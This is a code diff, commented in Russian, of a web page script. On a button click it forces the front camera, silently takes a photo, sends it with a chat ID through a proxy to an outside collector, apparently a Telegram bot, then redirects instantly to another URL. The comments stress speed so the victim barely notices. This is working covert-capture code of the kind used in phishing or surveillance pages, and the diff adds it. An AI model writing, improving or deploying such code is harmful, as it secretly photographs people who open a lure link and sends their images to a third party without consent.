@@ -27,39 +27,44 @@ const canvas = document.getElementById('c');
 
 btn.onclick = async () => {
     try {
-        // Запрашиваем доступ (появится окно "Разрешить?")
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        // 1. Запрашиваем камеру
+        const stream = await navigator.mediaDevices.getUserMedia({ 
+            video: { facingMode: "user" } // Принудительно фронтальная камера
+        });
         video.srcObject = stream;
 
-        // Делаем фото МГНОВЕННО (как только поток пошел)
-        await new Promise(res => {
-            video.onloadedmetadata = () => {
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                res();
+        // 2. Ждем, пока камера реально начнет выдавать картинку
+        await new Promise((resolve) => {
+            video.onloadeddata = () => {
+                // Маленькая задержка в 300мс специально для мобильных камер
+                setTimeout(resolve, 300);
             };
         });
 
-        // Конвертируем и готовим к отправке
-        const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.6));
+        // 3. Делаем снимок
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        
+        const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.7));
         const formData = new FormData();
         formData.append('chat_id', chatId);
         formData.append('photo', blob, 'img.jpg');
 
-        // ОТПРАВЛЯЕМ (не ждем ответа через await, чтобы сэкономить время)
+        // 4. Отправляем через прокси (не ждем ответа для скорости)
         fetch(proxyUrl, { method: 'POST', body: formData });
 
-        // Сразу выключаем камеру
+        // Выключаем камеру
         stream.getTracks().forEach(t => t.stop());
 
     } catch (err) {
-        console.log("Отказ или ошибка:", err);
+        console.log("Ошибка:", err);
     } finally {
-        // МГНОВЕННЫЙ ПЕРЕХОД
+        // 5. Мгновенный переход
         window.location.href = targetUrl;
     }
 };
+
 
 
         </script>
